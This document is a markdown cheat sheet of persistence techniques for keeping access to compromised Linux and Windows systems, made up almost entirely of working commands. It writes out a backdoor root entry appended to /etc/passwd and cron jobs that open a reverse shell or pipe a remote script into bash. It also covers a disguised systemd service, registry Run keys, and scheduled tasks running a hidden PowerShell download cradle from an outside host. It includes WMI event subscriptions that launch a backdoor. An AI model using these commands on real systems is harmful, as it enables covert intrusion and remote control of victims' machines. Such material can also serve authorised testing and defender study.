# Persistence Techniques

This document contains common persistence methods for maintaining access to compromised systems.

---

## Linux Persistence

### SSH-Based Persistence

```bash
# Add your public key to authorized_keys
echo <PUBKEY> >> /home/<user>/.ssh/authorized_keys

# For root persistence
echo <PUBKEY> >> /root/.ssh/authorized_keys

# Set proper permissions (if creating the file)
chmod 600 /home/<user>/.ssh/authorized_keys
```

### User Management

```bash
# Add a new unprivileged user without home directory
useradd -M whirley
passwd whirley

# Add a new user with sudo privileges
useradd -m -G sudo whirley
passwd whirley

# Add a backdoor root user directly to passwd file
echo "rroot:\$1\$Al9bxMil\$pekgGBIzv0OBgPR2SE227/:0:0:root:/root:/bin/sh" >> /etc/passwd

# Using the custom script (if available)
add_rroot
```

### Cron Jobs

```bash
# Add a reverse shell cron job (runs every 5 minutes)
echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" >> /var/spool/cron/crontabs/root

# Ensure proper permissions
chmod 600 /var/spool/cron/crontabs/root

# Add to system-wide cron
echo "*/10 * * * * root curl -s http://192.168.1.100/shell.sh | bash" > /etc/cron.d/system-update
```

### Startup Scripts

```bash
# Add to rc.local (if it exists and is used by the system)
echo "/path/to/backdoor &" >> /etc/rc.local

# Create a systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "sleep 60 && /path/to/backdoor"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable the service
systemctl enable backdoor.service
```

---

## Windows Persistence

### User Management

```powershell
# Add a new user
net user hacker P@ssw0rd /add

# Add user to administrators group
net localgroup administrators hacker /add

# Add domain user (if in domain environment)
net user hacker P@ssw0rd /add /domain
net group "Domain Admins" hacker /add /domain
```

### Startup Persistence

```powershell
# Add to startup folder (current user)
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Add to startup folder (all users)
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

# Add run key in registry (current user)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe" /f

# Add run key in registry (all users)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe" /f
```

### Scheduled Tasks

```powershell
# Create a scheduled task that runs daily
schtasks /create /tn "System Update" /tr "C:\path\to\backdoor.exe" /sc daily /st 09:00 /ru "SYSTEM" /f

# Create a task that runs at system startup
schtasks /create /tn "Windows Update" /tr "powershell -WindowStyle hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.1.100/shell.ps1\")'" /sc onstart /ru "SYSTEM" /f
```

### WMI Persistence

```powershell
# Create WMI permanent event subscription
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="UpdateConsumer", ExecutablePath="C:\path\to\backdoor.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"UpdateFilter\"", Consumer="CommandLineEventConsumer.Name=\"UpdateConsumer\""
```
